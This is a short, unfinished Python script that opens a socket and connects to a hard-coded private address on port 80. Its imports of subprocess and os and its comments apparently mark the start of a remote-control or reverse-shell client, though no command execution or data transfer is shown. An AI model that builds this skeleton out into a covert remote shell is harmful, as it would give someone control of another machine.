import socket
import os
import subprocess
import sys


s = socket.socket() # Creats a socket 

Name = socket.gethostname() #Gets name of Device
Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the current Device



Port = 80 # Port 80 HTTP

# separator string for sending 2 messages in one go

# connect to the server. (IP address of Host is needed. Find a way to completely bypass this)
s.connect(('10.67.98.152', Port)) #Hard coded. Change to your computer's IP in order to test code


